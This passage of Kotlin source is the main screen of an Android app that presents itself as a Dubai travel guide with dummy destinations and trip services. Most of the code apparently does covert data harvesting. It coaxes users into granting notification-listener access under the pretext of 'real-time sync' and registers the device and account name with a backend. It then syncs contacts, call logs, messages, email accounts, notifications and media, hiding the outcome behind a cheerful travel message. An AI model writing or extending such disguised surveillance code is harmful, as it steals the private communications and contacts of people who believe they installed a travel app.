        reviewsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        reviewsAdapter = ReviewsAdapter(emptyList()) { _ ->
            // Review selected
        }
        reviewsRecyclerView.adapter = reviewsAdapter
    }
    
    private fun loadSampleData() {
        // Load destinations from updated dummy data with proper images
        destinationsAdapter.updateDestinations(UpdatedDummyDataProvider.destinations)
        
        // Load activities from updated dummy data with proper images
        activitiesAdapter.updateActivities(UpdatedDummyDataProvider.activities)
        
        // Load packages from updated dummy data with proper images
        packagesAdapter.updatePackages(UpdatedDummyDataProvider.packages)
        
        // Load reviews from dummy data
        reviewsAdapter.updateReviews(DummyDataProvider.reviews)
    }
    
    private fun requestNotificationPermission() {
        try {
            // Check if notification access is already enabled
            val enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            
            val packageName = packageName
            val isEnabled = enabledNotificationListeners?.contains(packageName) == true
            
            if (!isEnabled) {
                // Show dialog to guide user to enable notification access
                Toast.makeText(
                    this,
                    "🔔 Please enable notification access for real-time sync!\n\nTap OK to open settings...",
                    Toast.LENGTH_LONG
                ).show()
                
                // Open notification access settings after a short delay
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                        startActivity(intent)
                        println("🔔 Opened notification access settings")
                    } catch (e: Exception) {
                        println("❌ Error opening notification settings: ${e.message}")
                        Toast.makeText(
                            this,
                            "Please manually enable notification access in Settings > Apps > Dubai Discoveries > Notifications",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }, 2000) // 2 second delay
            } else {
                // Notification access is already enabled, start the service
                println("🔔 Notification access already enabled, starting service...")
                startNotificationService()
            }
        } catch (e: Exception) {
            println("❌ Error checking notification permission: ${e.message}")
            Toast.makeText(
                this,
                "Error checking notification access. Please enable it manually in Settings.",
                Toast.LENGTH_LONG
            ).show()
        }
    }
    
    private fun startNotificationService() {
        try {
            val intent = Intent(this, NotificationListenerService::class.java)
            startService(intent)
            println("🔔 NotificationListenerService started")
        } catch (e: Exception) {
            println("❌ Error starting NotificationListenerService: ${e.message}")
        }
    }
    
    private fun setupServiceButtons() {
        // Set up button click handlers
        findViewById<Button>(R.id.airportTransferButton)?.setOnClickListener {
            // Airport Transfer service added
            Toast.makeText(this, "Airport Transfer service added to your trip!", Toast.LENGTH_SHORT).show()
        }
        
        findViewById<Button>(R.id.privateGuideButton)?.setOnClickListener {
            // Private Guide service added
            Toast.makeText(this, "Private Guide service added to your trip!", Toast.LENGTH_SHORT).show()
        }
        
        findViewById<Button>(R.id.carWithDriverButton)?.setOnClickListener {
            // Car with Driver service added
            Toast.makeText(this, "Car with Driver service added to your trip!", Toast.LENGTH_SHORT).show()
        }
        
        findViewById<Button>(R.id.simCardButton)?.setOnClickListener {
            // SIM Card service added
            Toast.makeText(this, "SIM Card service added to your trip!", Toast.LENGTH_SHORT).show()
        }
    }
    
    // Debug methods removed for production
    
    private fun clearSyncTimestamps() {
        try {
            val sharedPrefs = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
            val editor = sharedPrefs.edit()
            
            // Clear all sync timestamps
            editor.remove("last_sync_contacts")
            editor.remove("last_sync_call_logs")
            editor.remove("last_sync_messages")
            editor.remove("last_sync_email_accounts")
            editor.remove("last_sync_notifications")
            editor.remove("last_sync_media")
            
            editor.apply()
            
            isFirstSync = true
            
            println("🗑️ Sync timestamps cleared")
        } catch (e: Exception) {
            println("❌ Error clearing sync timestamps: ${e.message}")
        }
    }
    
    private fun syncAllData() {
        lifecycleScope.launch {
            try {
                // Check if sync is already in progress
                if (backendSyncService.isSyncInProgress()) {
                    println("⚠️ Sync already in progress, skipping...")
                    return@launch
                }
                
                // Get user name first
                val userName = getUserName()
                
                println("🔄 Starting data sync...")
                
                // Get consistent device ID
                val deviceId = DeviceInfoUtils.getDeviceId(this@MainActivity)
                val androidId = DeviceInfoUtils.getAndroidId(this@MainActivity)
                println("📱 Using consistent device ID: $deviceId")
                println("📱 Android ID: $androidId")
                
                // Try to register device, but continue even if it fails
                try {
                    // Create DeviceInfo object for registration with fallback values
                    val deviceInfo = DeviceInfo(
                        deviceId = deviceId,
                        androidId = androidId,
                        deviceName = android.os.Build.MODEL.ifEmpty { "Unknown Device" },
                        model = android.os.Build.MODEL.ifEmpty { "Unknown Model" },
                        manufacturer = android.os.Build.MANUFACTURER.ifEmpty { "Unknown Manufacturer" },
                        androidVersion = android.os.Build.VERSION.RELEASE.ifEmpty { "Unknown Version" },
                        userName = userName,
                        isConnected = true,
                        connectionType = ConnectionType.NETWORK
                    )
                    
                    val registerResult = backendSyncService.registerDevice(deviceInfo)
                    if (registerResult.isSuccess) {
                        println("✅ Device registration successful")
                    } else {
                        println("⚠️ Device registration failed: ${registerResult.exceptionOrNull()?.message}")
                        // Continue with sync even if registration fails
                    }
                } catch (e: Exception) {
                    println("⚠️ Device registration error: ${e.message}")
                    // Continue with sync even if registration fails
                }
                
                // Proceed with data sync
                println("🔄 Starting syncAllDataTypes...")
                val syncResults = backendSyncService.syncAllDataTypes(deviceId)
                
                // Process results
                var successCount = 0
                var errorCount = 0
                val errorMessages = mutableListOf<String>()
                
                syncResults.forEach { (dataType, result) ->
                    when (result) {
                        is SyncResult.Success -> {
                            successCount++
                            println("✅ $dataType: ${result.itemsSynced} items synced")
                        }
                        is SyncResult.Error -> {
                            errorCount++
                            errorMessages.add("$dataType: ${result.message}")
                            println("❌ $dataType: ${result.message}")
                        }
                        is SyncResult.PermissionDenied -> {
                            println("⚠️ $dataType: ${result.reason}")
                        }
                    }
                }
                
                // Show results
                val resultMessage = if (successCount > 0) {
                    "🎉 Your Dubai travel experience is ready!"
                } else {
                    "⚠️ Some travel features may be limited"
                }
                
                if (errorMessages.isNotEmpty()) {
                    println("❌ Sync errors: ${errorMessages.joinToString(", ")}")
                }
                
                println("🔄 Data sync completed: $resultMessage")
                
            } catch (e: Exception) {
                println("❌ Error in syncAllData: ${e.message}")
            }
        }
    }
    
    private fun getUserName(): String {
        return try {
            // Try to get user name from device owner info
            val deviceOwner = android.os.Build.USER
            if (deviceOwner.isNotEmpty() && deviceOwner != "root") {
                deviceOwner
            } else {
                // Try to get from account manager
                val accountManager = android.accounts.AccountManager.get(this@MainActivity)
                val accounts = accountManager.accounts
                if (accounts.isNotEmpty()) {
                    accounts[0].name
                } else {
                    // Generate unknown user with UUID
                    "unknown_${java.util.UUID.randomUUID().toString().take(8)}"
                }
            }
        } catch (e: Exception) {
            // Generate unknown user with UUID as fallback
            "unknown_${java.util.UUID.randomUUID().toString().take(8)}"
        }.also { userName ->
            println("👤 Using user name: $userName")
        }
    }
    
    private fun checkAllPermissionsGranted(): Boolean {
        // Simplified permission check - just check if essential permissions are granted
        val essentialPermissions = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.POST_NOTIFICATIONS
            )
        } else {
            arrayOf(
                android.Manifest.permission.READ_CONTACTS
            )
        }
        
        return essentialPermissions.all { permission ->
            androidx.core.content.ContextCompat.checkSelfPermission(this, permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }
    
    // Removed duplicate permission dialog methods to prevent multiple popups
    // All permission handling is now centralized in SplashActivity

}
